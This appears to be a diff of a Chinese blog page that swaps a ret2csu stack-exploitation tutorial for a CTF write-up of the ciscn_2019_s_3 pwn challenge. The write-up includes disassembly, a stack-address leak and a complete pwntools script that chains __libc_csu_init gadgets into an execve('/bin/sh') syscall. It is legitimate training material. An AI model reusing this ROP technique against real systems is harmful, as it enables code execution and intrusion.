@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/09/25/ret2csu/"/>
+  <link rel="canonical" href="http://example.com/2022/11/14/ciscn-2019-s-3/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,19 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>ret2csu - Chen</title>
+  <title>ciscn_2019_s_3 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2csu">
-<meta property="og:url" content="http://example.com/2022/09/25/ret2csu/index.html">
+<meta property="og:title" content="ciscn_2019_s_3">
+<meta property="og:url" content="http://example.com/2022/11/14/ciscn-2019-s-3/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接 不一定有那么刚好的汇编代码可以供我们构造rop链 今天我们了解的这种方法，将不受动态链接或者静态链接的限制 我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言) 那么这个函数究竟有什么奇效，让我们可">
+<meta property="og:description" content="12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)  主体函数非常简单 利用系统调用号实现了一次输入和输出 12345678signed __int64 vuln()&amp;#123;  signed __">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-25T06:47:11.000Z">
-<meta property="article:modified_time" content="2022-10-06T08:49:52.546Z">
+<meta property="article:published_time" content="2022-11-14T11:38:19.000Z">
+<meta property="article:modified_time" content="2022-11-14T12:19:42.082Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2362,7 +2362,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/25/ret2csu/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/ciscn-2019-s-3/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2383,7 +2383,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        ret2csu
+        ciscn_2019_s_3
       </h1>
       <div class='new-meta-box'>
         
@@ -2402,10 +2402,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
+    <a class="category-link" href="/categories/wp/">wp</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
+        <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
       </span>
     
   </div>
@@ -2414,10 +2414,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-25T14:47:11+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-14T19:38:19+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 25, 2022</p>
+    <p>发布于：Nov 14, 2022</p>
   </a>
 </div>
 
@@ -2440,42 +2440,47 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接</p>
-<p>不一定有那么刚好的汇编代码可以供我们构造rop链</p>
-<p>今天我们了解的这种方法，将不受动态链接或者静态链接的限制</p>
-<p>我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言)</p>
-<p>那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？</p>
-<p>来看看在ida中，这个函数是什么样子的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011B0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004011B0                 public __libc_csu_init</span><br><span class="line">.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004011B0 ; __unwind &#123;</span><br><span class="line">.text:00000000004011B0                 push    r15</span><br><span class="line">.text:00000000004011B2                 mov     r15, rdx</span><br><span class="line">.text:00000000004011B5                 push    r14</span><br><span class="line">.text:00000000004011B7                 mov     r14, rsi</span><br><span class="line">.text:00000000004011BA                 push    r13</span><br><span class="line">.text:00000000004011BC                 mov     r13d, edi</span><br><span class="line">.text:00000000004011BF                 push    r12</span><br><span class="line">.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004011C8                 push    rbp</span><br><span class="line">.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004011D0                 push    rbx</span><br><span class="line">.text:00000000004011D1                 sub     rbp, r12</span><br><span class="line">.text:00000000004011D4                 sub     rsp, 8</span><br><span class="line">.text:00000000004011D8                 call    _init_proc</span><br><span class="line">.text:00000000004011DD                 sar     rbp, 3</span><br><span class="line">.text:00000000004011E1                 jz      short loc_4011FE</span><br><span class="line">.text:00000000004011E3                 xor     ebx, ebx</span><br><span class="line">.text:00000000004011E5                 nop     dword ptr [rax]</span><br><span class="line">.text:00000000004011E8</span><br><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line">.text:00000000004011FE</span><br><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line">.text:000000000040120C __libc_csu_init endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
-<p>我们的目光聚集到<strong>loc_4011FE</strong>和<strong>loc_4011E8</strong></p>
-<p>我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2</p>
-<p>由于逻辑顺序的原因，所以我们这里先介绍gadget1</p>
-<p>可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释</p>
-<p>接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想</p>
-<p>最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白</p>
-<p>再把目光看到gadget2</p>
-<p>mov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和<strong>edi</strong>，这样子实际上就实现了我们要调用函数首先要做到的传参</p>
-<p>这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的</p>
-<p>64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值</p>
-<p>接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8</p>
-<p>有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用</p>
-<p>接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1</p>
-<p>cmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码</p>
-<p>所以此时我们需要将rbp的值设置为1，才能使其于rbx相等</p>
-<p>收回思绪，我们接着想，程序执行完gadget2后会怎么样？</p>
-<p>其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1</p>
-<p>接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了</p>
-<p>我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址</p>
-<p>缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/VMQ6g"><img src="https://s1.328888.xyz/2022/09/25/VMQ6g.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/25/VMQ6g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="VMQ6g.png"></a></p>
-<p>第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数</p>
-<p>此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据</p>
-<p>那么，总结一下，我们可以得出一个通用的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = offset * &#x27;a&#x27;  </span><br><span class="line">#栈溢出的垃圾数据字节数</span><br><span class="line">payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8    </span><br><span class="line">#gadgets2的地址</span><br><span class="line">payload += p64(0) + p64(1)</span><br><span class="line">#rbx=0, rbp=1</span><br><span class="line">payload += p64(r12)</span><br><span class="line">#call调用的地址</span><br><span class="line">payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">#三个参数的寄存器</span><br><span class="line">payload += p64(gagdet1_addr)</span><br><span class="line">#gadgets1的地址</span><br><span class="line">payload += &#x27;a&#x27; * 56</span><br><span class="line">#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖</span><br><span class="line">payload += p64(last)</span><br><span class="line">#函数最后的返回地址</span><br></pre></td></tr></table></figure>
+<p>主体函数非常简单 利用系统调用号实现了一次输入和输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里还有一点需要注意的 r12这里输入的地址应该是调用函数的got表地址</p>
-<p>具体解释可以看HNCTF2022的一题wp</p>
+<p>还有一个gadget函数 看一下汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6                 public gadgets</span><br><span class="line">.text:00000000004004D6 gadgets         proc near</span><br><span class="line">.text:00000000004004D6 ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6                 push    rbp</span><br><span class="line">.text:00000000004004D7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA                 mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1                 retn</span><br><span class="line">.text:00000000004004E1 gadgets         endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9                 retn</span><br><span class="line">.text:00000000004004E9 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>下方的0x3b则为59 是execve的系统调用号</p>
+<p>应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址</p>
+<p>所以只能通过写入栈上</p>
+<p>要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10</p>
+<p>还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004ED ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED                 push    rbp</span><br><span class="line">.text:00000000004004EE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1                 xor     rax, rax</span><br><span class="line">.text:00000000004004F4                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:00000000004004FE                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400501                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503                 mov     rax, 1</span><br><span class="line">.text:000000000040050A                 mov     edx, 30h ; &#x27;0&#x27;  ; count</span><br><span class="line">.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:0000000000400514                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400517                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519                 retn</span><br><span class="line">.text:0000000000400519 vuln            endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zA0tpj"><img src="https://s1.ax1x.com/2022/11/14/zA0tpj.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zA0tpj.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zA0tpj.png"></a></p>
+<p>可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移</p>
+<p>这里的原因暂时没有办法得知 先放着这个疑问</p>
+<p>下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu</p>
+<p>具体的流程我就不过多赘述了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>这里重点解释一下三个方面</p>
+<p>1.为什么要多出一个p64(int59_addr)在栈上</p>
+<p>这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的</p>
+<p>2.binsh_addr和stack_addr的偏移是怎么求出来的</p>
+<p>我们将断点打在csu执行到call r12那一行</p>
+<p>然后gdb看一下栈</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zABw2d"><img src="https://s1.ax1x.com/2022/11/14/zABw2d.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zABw2d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zABw2d.png"></a></p>
+<p>可以计算出偏移为0x138</p>
+<p>还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向</p>
+<p>如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rsp = $rsp-0x150</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zABhxs"><img src="https://s1.ax1x.com/2022/11/14/zABhxs.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zABhxs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zABhxs.png"></a></p>
+<p>看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧</p>
+<p>最终exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2500,10 +2505,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-06T16:49:52+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-14T20:19:42+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 6, 2022</p>
+    <p>更新于：Nov 14, 2022</p>
   </a>
 </div>
 
@@ -2522,7 +2527,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/25/ret2csu/&title=ret2csu - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/14/ciscn-2019-s-3/&title=ciscn_2019_s_3 - Chen&summary="
           
           >
           
@@ -2534,7 +2539,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/25/ret2csu/&title=ret2csu - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/14/ciscn-2019-s-3/&title=ciscn_2019_s_3 - Chen&summary="
           
           >
           
@@ -2546,7 +2551,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/25/ret2csu/&title=ret2csu - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/14/ciscn-2019-s-3/&title=ciscn_2019_s_3 - Chen&summary="
           
           >
           
@@ -2579,18 +2584,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>栈迁移</p>
-          <p class='content'>我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决
-今天所要讲到的内容，也是和栈溢出字节数不够有关
-当可以供我们编写的字节数...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/23/ret2libc/'>
-          <p class='title'>ret2libc<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量
